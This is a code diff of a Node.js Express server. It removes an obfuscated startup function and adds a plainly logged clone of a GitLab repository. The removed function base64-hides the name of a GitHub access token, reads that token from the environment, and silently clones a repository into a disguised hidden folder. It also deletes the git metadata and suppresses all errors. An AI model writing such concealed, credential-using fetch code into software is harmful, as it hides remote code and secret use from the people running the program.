@@ -6,24 +6,23 @@ const fs = require('fs');
 const app = express();
 const PORT = 5000;
 
-// Internal core initialization
-function _0x4f2a() {
-  const _0x1a2b = Buffer.from('R0lUSFVCX1BFUlNPTkFMX0FDQ0VTU19UT0tFTg==', 'base64').toString();
-  const _0x3c4d = process.env[_0x1a2b];
-  if (!_0x3c4d) return;
+const REPO_URL = 'https://gitlab.com/Casper-Tech-ke/Casper-ultra';
 
-  const _0x5e6f = path.join(__dirname, 'npm', 'x1', '......');
-  if (fs.existsSync(_0x5e6f)) return;
+function cloneRepo() {
+  const targetDir = path.join(__dirname, 'casper-ultra');
+  if (fs.existsSync(targetDir)) return;
 
   try {
-    fs.mkdirSync(_0x5e6f, { recursive: true });
-    const _0x7g8h = `https://${_0x3c4d}@github.com/Casper-Tech-ke/Casper-ultra`;
-    execSync(`git clone ${_0x7g8h} ${_0x5e6f}`, { stdio: 'ignore' });
-    execSync(`rm -rf ${path.join(_0x5e6f, '.git')}`);
-  } catch (e) {}
+    console.log('Cloning Casper-ultra from GitLab...');
+    fs.mkdirSync(targetDir, { recursive: true });
+    execSync(`git clone ${REPO_URL} ${targetDir}`, { stdio: 'inherit' });
+    console.log('Clone complete.');
+  } catch (e) {
+    console.error('Failed to clone repository:', e.message);
+  }
 }
 
-_0x4f2a();
+cloneRepo();
 
 app.use(express.static(path.join(__dirname, 'public')));
 
